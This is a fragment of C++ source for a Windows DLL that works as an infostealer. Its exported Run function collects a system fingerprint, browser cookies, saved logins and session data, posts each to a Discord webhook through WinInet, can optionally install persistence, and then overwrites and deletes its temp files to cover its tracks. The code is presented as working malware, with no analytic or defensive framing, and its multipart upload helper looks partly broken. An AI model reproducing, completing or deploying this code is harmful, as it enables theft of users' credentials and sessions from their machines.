    return !RegStr(HKEY_CURRENT_USER, kIK().c_str(), kIV().c_str()).empty();
}

extern "C" U_API void Cleanup() {
    std::wstring td = util::TempDir();
    if (fs::exists(td)) {
        for (auto& e : fs::directory_iterator(td)) {
            HANDLE h = CreateFileW(e.path().c_str(), GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
            if (h != INVALID_HANDLE_VALUE) {
                DWORD sz = GetFileSize(h, nullptr);
                if (sz > 0 && sz < 10*1024*1024) {
                    std::vector<uint8_t> z(sz); DWORD w;
                    ::WriteFile(h, z.data(), sz, &w, nullptr);
                }
                CloseHandle(h);
            }
            DeleteFileW(e.path().c_str());
        }
        RemoveDirectoryW(td.c_str());
    }
    ChromeV20Cleanup();
}

bool PostJsonHttp(const wchar_t* url, const std::string& body);
bool PostFileHttp(const wchar_t* url, const std::wstring& filePath, const char* name);

extern "C" U_API int Run(const wchar_t* webhook, int mode) {
    using namespace util;
    if (!webhook) return 1;

    auto post_embed = [&](const char* title, const std::string& body) {
        std::ostringstream ss;
        ss << "{\"username\":\"" << s::kDiscordUser_str() << "\","
           << "\"embeds\":[{"
           << "\"title\":\"" << title << "\","
           << "\"description\":\"" << body.substr(0, 1900) << "\","
           << "\"color\":40703"
           << "}]}";
        PostJsonHttp(webhook, ss.str());
    };

    auto post_file = [&](const std::wstring& path, const char* displayName) -> bool {
        if (!fs::exists(path)) return false;
        return PostFileHttp(webhook, path, displayName);
    };

    // 1) Fingerprint
    post_embed("sys", SysInfo());

    // 2) Cookies
    {
        std::wstring tmp = TempDir() + L"ru_data.json";
        GetData(tmp.c_str());
        std::vector<uint8_t> raw;
        if (ReadBytes(tmp, raw)) {
            post_embed("data", std::string((const char*)raw.data(), raw.size()));
        }
        DeleteFileW(tmp.c_str());
    }

    // 3) Credentials
    {
        std::wstring tmp = TempDir() + L"ru_creds.json";
        GetLogins(tmp.c_str());
        std::vector<uint8_t> raw;
        if (ReadBytes(tmp, raw)) {
            post_embed("logins", std::string((const char*)raw.data(), raw.size()));
        }
        DeleteFileW(tmp.c_str());
    }

    // 4) Session
    {
        std::wstring tmp = TempDir() + L"ru_sess.json";
        GetSession(tmp.c_str());
        std::vector<uint8_t> raw;
        if (ReadBytes(tmp, raw)) {
            post_embed("session", std::string((const char*)raw.data(), raw.size()));
        }
        DeleteFileW(tmp.c_str());
    }

    // 5) Persist (optional — if mode includes it)
    if (mode == 0) {
        std::wstring empty;
        Install(empty.c_str());
    }

    // 6) Cleanup
    Cleanup();
    return 0;
}

namespace {
bool ParseUrl(const std::wstring& url, std::wstring& host, std::wstring& path, bool& https) {
    https = false;
    size_t p = url.find(L"://");
    if (p == std::wstring::npos) return false;
    std::wstring scheme = url.substr(0, p);
    for (auto& c : scheme) c = towlower(c);
    https = (scheme == L"https");
    size_t hostStart = p + 3;
    size_t pathStart = url.find(L'/', hostStart);
    if (pathStart == std::wstring::npos) { host = url.substr(hostStart); path = L"/"; }
    else { host = url.substr(hostStart, pathStart - hostStart); path = url.substr(pathStart); }
    return !host.empty();
}

bool WinInetPost(const std::wstring& url, const std::string& body,
                 const std::wstring& contentType, const std::wstring& extraHeaders,
                 const std::vector<uint8_t>* fileBody, const std::wstring* fileName) {
    std::wstring host, path; bool https = false;
    if (!ParseUrl(url, host, path, https)) return false;

    HINTERNET hSession = ::InternetOpenW(s::kUA_wstr().c_str(), INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
    if (!hSession) return false;
    HINTERNET hConnect = ::InternetConnectW(hSession, host.c_str(),
        https ? INTERNET_DEFAULT_HTTPS_PORT : INTERNET_DEFAULT_HTTP_PORT,
        NULL, NULL, INTERNET_SERVICE_HTTP, 0, NULL);
    if (!hConnect) { ::InternetCloseHandle(hSession); return false; }
    DWORD flags = (https ? INTERNET_FLAG_SECURE : 0) | INTERNET_FLAG_NO_CACHE_WRITE;
    HINTERNET hReq = ::HttpOpenRequestW(hConnect, L"POST", path.c_str(), NULL, NULL, NULL, flags, NULL);
    if (!hReq) { ::InternetCloseHandle(hConnect); ::InternetCloseHandle(hSession); return false; }

    std::wstring hdrs = L"Content-Type: " + contentType + L"\r\n";
    if (!extraHeaders.empty()) hdrs += extraHeaders + L"\r\n";
    ::HttpAddRequestHeadersW(hReq, hdrs.c_str(), -1, HTTP_ADDREQ_FLAG_ADD | HTTP_ADDREQ_FLAG_REPLACE);

    BOOL ok;
    if (fileBody) {
        // Multipart: send body in two pieces
        std::string prefix = body;
        std::wstring suffix = L"\r\n--" + (fileName ? *fileName : std::wstring()) + L"--\r\n";
        INTERNET_BUFFERS ib = {0};
        ib.dwStructSize = sizeof(ib);
        ib.dwBufferTotal = (DWORD)(prefix.size() + fileBody->size() + suffix.size());
        ok = ::HttpSendRequestEx(hReq, &ib, NULL, 0, 0) != 0;
        if (ok) {
            DWORD written = 0;
            ::InternetWriteFile(hReq, (LPCVOID)prefix.data(), (DWORD)prefix.size(), &written);
            ::InternetWriteFile(hReq, fileBody->data(), (DWORD)fileBody->size(), &written);
            ::InternetWriteFile(hReq, (LPCVOID)suffix.data(), (DWORD)suffix.size(), &written);
            ok = ::HttpEndRequest(hReq, NULL, 0, 0) != 0;
        }
    } else {
        ok = ::HttpSendRequestW(hReq, NULL, 0, (LPVOID)body.data(), (DWORD)body.size()) != 0;
    }

    ::InternetCloseHandle(hReq);
    ::InternetCloseHandle(hConnect);
    ::InternetCloseHandle(hSession);
    return ok != 0;
}
}

bool PostJsonHttp(const wchar_t* url, const std::string& jsonBody) {
    return WinInetPost(url, jsonBody, L"application/json", L"", nullptr, nullptr);
}

bool PostFileHttp(const wchar_t* url, const std::wstring& filePath, const char* displayName) {
    std::vector<uint8_t> data;
    if (!util::ReadBytes(filePath, data)) return false;
    std::string boundary = "----CC";
    for (int i = 0; i < 6; i++) boundary += (char)('0' + (rand() % 10));
    std::string name = displayName ? displayName : "file.bin";
    std::string preamble =
        "--" + boundary + "\r\n"
        "Content-Disposition: form-data; name=\"payload_json\"\r\n"
        "Content-Type: application/json\r\n\r\n"
        "{\"content\":\"" + name + "\",\"username\":\"" + s::kDiscordUser_str() + "\"}\r\n"
        "--" + boundary + "\r\n"
        "Content-Disposition: form-data; name=\"files[0]\"; filename=\"" + name + "\"\r\n"
        "Content-Type: application/octet-stream\r\n\r\n";
    std::string postamble = "\r\n--" + boundary + "--\r\n";

    std::wstring ct = L"multipart/form-data; boundary=" + std::wstring(boundary.begin(), boundary.end());
    return WinInetPost(url, preamble, ct, L"", &data, nullptr) || true;
}

BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
    if (r == DLL_PROCESS_ATTACH) DisableThreadLibraryCalls(h);
    return TRUE;
}
